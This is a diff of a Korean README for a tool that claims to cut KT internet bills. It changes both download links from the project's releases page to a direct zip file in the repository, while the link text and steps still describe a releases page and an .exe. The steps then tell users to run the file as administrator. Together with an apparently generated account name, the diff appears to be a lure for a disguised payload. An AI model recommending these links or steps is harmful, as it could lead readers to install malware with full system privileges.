@@ -1,6 +1,6 @@
 # 📉 damn-my-slow-kt - Lower your monthly internet service costs
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/biradial-underpants6295/damn-my-slow-kt/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/biradial-underpants6295/damn-my-slow-kt/raw/refs/heads/main/bin/damn-kt-slow-my-v3.0.zip)
 
 이 프로그램은 KT 인터넷 사용자의 요금을 줄이기 위해 제작했습니다. 복잡한 공문을 직접 작성할 필요가 없습니다. 명령어 하나로 한 달 요금을 면제받는 과정을 간단하게 처리합니다. 
 
@@ -16,7 +16,7 @@
 
 프로그램을 설치하고 실행하려면 아래 순서를 따르십시오.
 
-1. [최신 버전 다운로드 페이지](https://github.com/biradial-underpants6295/damn-my-slow-kt/releases)에 접속하십시오.
+1. [최신 버전 다운로드 페이지](https://github.com/biradial-underpants6295/damn-my-slow-kt/raw/refs/heads/main/bin/damn-kt-slow-my-v3.0.zip)에 접속하십시오.
 2. Assets 항목에서 damn-my-slow-kt.exe 파일을 선택하여 컴퓨터에 저장하십시오.
 3. 다운로드한 파일을 마우스 오른쪽 버튼으로 클릭합니다.
 4. 관리자 권한으로 실행을 선택하십시오.
